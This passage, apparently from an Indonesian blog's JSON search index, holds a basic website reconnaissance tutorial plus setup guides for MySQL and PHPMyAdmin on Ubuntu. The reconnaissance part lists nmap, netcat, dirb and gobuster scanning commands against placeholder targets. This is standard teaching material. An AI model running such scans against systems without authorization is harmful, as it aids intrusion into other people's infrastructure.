arsitektur target untuk mengidentifikasi komponen atau layanan yang mungkin tersedia.\nCara:\nIdentifikasi Subdomain:\nGunakan alat seperti sublist3r untuk menemukan subdomain yang mungkin terkait dengan target. Peta Situs:\nJika tersedia, ambil dan periksa peta situs dari target untuk mendapatkan daftar URL dan direktori yang mungkin ada. Cara Melakukan Active Scanning # Port Scanning # Penjelasan:\nPort scanning adalah teknik untuk mengidentifikasi port yang terbuka di target dan layanan yang berjalan di port-port tersebut.\nCara:\nGunakan Nmap: Basic Scan: nmap \u0026lt;target\u0026gt; – Memindai port yang umum. Custom Port Scan: nmap -p 1-65535 \u0026lt;target\u0026gt; – Memindai semua port. Service Version Detection: nmap -sV \u0026lt;target\u0026gt; – Menampilkan versi layanan yang berjalan di port yang terbuka. Gunakan Netcat:\nnc -zv \u0026lt;target\u0026gt; \u0026lt;port\u0026gt; – Memeriksa port terbuka satu per satu. Service Enumeration # Penjelasan:\nService enumeration adalah proses mengidentifikasi layanan yang berjalan pada port yang terbuka dan versi spesifik dari layanan tersebut.\nCara:\nGunakan Nmap: Deteksi Versi Layanan: nmap -sV \u0026lt;target\u0026gt; – Mengidentifikasi versi layanan. Deteksi OS: nmap -O \u0026lt;target\u0026gt; – Mengidentifikasi sistem operasi yang digunakan. Gunakan Banner Grabbing:\nDapat dilakukan dengan tools seperti netcat atau telnet untuk mengambil banner yang biasanya mencantumkan informasi versi layanan. Path Enumeration # Penjelasan:\nPath enumeration mencari direktori dan file tersembunyi di server web yang dapat memberikan informasi atau akses lebih lanjut.\nCara:\nGunakan Dirb: Basic Scan: dirb http://\u0026lt;target\u0026gt; – Mencari direktori dan file dengan wordlist default. Gunakan Gobuster: Basic Scan: gobuster dir -u http://\u0026lt;target\u0026gt; -w \u0026lt;wordlist\u0026gt; – Mencari path yang tersembunyi menggunakan wordlist yang ditentukan. ","date":"24 Agustus 2024","externalUrl":null,"permalink":"/contents/cyber-security/basic-website-reconnaissance/","section":"Contents","summary":"","title":"Basic Website Reconnaissance","type":"contents"},{"content":"MySQL adalah database server yang populer digunakan untuk menyimpan data. Pada artikel ini, saya akan menunjukkan cara mengkonfigurasi MySQL server yang baru diinstal pada Ubuntu.\nLangkah 1: Instal MySQL Server # sudo apt update sudo apt install mysql-server Langkah 2: Konfigurasi MySQL Server # sudo mysql_secure_installation Sekarang MySQL server sudah terkonfigurasi dan siap dihubungkan melalui port 3306.\nMasalah yang sering terjadi saat mengkonfigurasi MySQL Server pertama kali # beberapa masalah yang sering terjadi saat mengkonfigurasi MySQL Server pertama kali adalah: biasanya saat mengkonfigurasi MySQL Server pertama kali, secara default MySQL mengatur password root MySQL, user=root, password=empty. Jika Mencoba login menggunakan password kosong, akan muncul pesan error.\nERROR 1698 (28000): Access denied for user 'root'@'localhost' Untuk mengatasi masalah ini, bisa mengikuti langkah berikut:\nStart MySQL dengan sudo. sudo mysql Reset password root MySQL ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;New_Password\u0026#39;; FLUSH PRIVILEGES; EXIT; Restart MySQL dan login dengan password baru sudo systemctl restart mysql mysql -u root -p Catatan: untuk versi MySQL Terbaru seperti 8.0 keatas, tidak bisa login menggunakan perintah mysql -u root -p new_password, Anda harus login menggunakan perintah mysql -u root -p kemudian masukkan password. Mungkin itu saja yang bisa saya bagikan tentang cara mengkonfigurasi MySQL Server yang baru diinstal pada Ubuntu. Jika masih ada error diluar pembahasan diatas, bisa bertanya lewat ChatGPT atau pakai Google. Semoga bermanfaat.\n","date":"24 Agustus 2024","externalUrl":null,"permalink":"/contents/development/configure-fresh-mysql/","section":"Contents","summary":"","title":"Configure Fresh MySQL Server Install on Ubuntu","type":"contents"},{"content":"PHPMyAdmin adalah aplikasi web yang digunakan untuk mengelola database MySQL. PHPMyAdmin memungkinkan pengguna untuk membuat, mengedit, dan menghapus database, tabel, dan field. PHPMyAdmin juga memungkinkan pengguna untuk menjalankan query SQL dan mengelola pengguna dan hak akses.\nPada artikel ini, saya akan menunjukkan cara mengkonfigurasi PHPMyAdmin pada Ubuntu. PHPMyAdmin membutuhkan web server dan PHP untuk berjalan. Oleh karena itu, pastikan Anda sudah menginstal web server dan PHP sebelum menginstal PHPMyAdmin.\nLangkah 1: Instal PHPMyAdmin # sudo apt update sudo apt install phpmyadmin apache2 mysql-server php Catatan: Saat Anda menjalankan perintah mungkin ada beberapa library yang dibutuhkan untuk menjalankan PHPMyAdmin.\nLangkah 2: Konfigurasi PHPMyAdmin # sudo phpenmod mbstring sudo systemctl restart apache2 #tambah phpmyadmin ke apache2 www-data sudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin sudo systemctl restart apache2 Beres! # Sekarang PHPMyAdmin sudah terkonfigurasi dan dapat mengakses PHPMyAdmin melalui browser dengan alamat http://localhost/phpmyadmin.\n","date":"24 Agustus 2024","externalUrl":null,"permalink":"/contents/development/configure-phpmyadmin/","section":"Contents","summary":"","title":"Configure PHPMyAdmin on Ubuntu","type":"contents"},{"content":"","date":"24 Agustus 2024","externalUrl":null,"permalink":"/categories/cyber-security/","section":"Categories","summary":"","title":"Cyber Security","type":"categories"},{"content":"","date":"24 Agustus 2024","externalUrl":null,"permalink":"/tags/mysql/","section":"Tags","summary":"","title":"MySQL","type":"tags"},{"content":"","date":"24 Agustus 2024","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"PHP","type":"tags"},{"content":"","date":"24 Agustus 2024","externalUrl":null,"permalink":"/tags/phpmyadmin/","section":"Tags","summary":"","title":"PHPMyAdmin","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]